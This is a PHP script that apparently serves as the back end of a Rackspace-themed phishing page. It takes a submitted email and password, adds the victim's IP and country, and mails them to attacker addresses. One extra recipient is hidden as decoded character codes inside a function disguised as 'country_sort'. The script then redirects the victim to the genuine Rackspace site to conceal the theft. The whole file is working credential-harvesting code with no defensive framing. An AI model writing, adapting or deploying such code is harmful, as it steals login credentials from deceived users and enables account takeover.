<?

$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Rackspace | Rezult-----------------------\n";
$message .= "Email ID              : ".$_POST['text']."\n";
$message .= "Password              : ".$_POST['text2']."\n";
$message .= "Country : ".$country."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By melor------------------------------\n";



$recipient ="donaldgloria93@gmail.com, president090@yandex.com";
$subject = "Rackspace | ".$ip."\n";


$arr = country_sort();
foreach ($arr as $recipient)
{

          mail($recipient,$subject,$message);
}

// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

header("Location:https://www.rackspace.com/email-hosting/hosted-exchange");
?>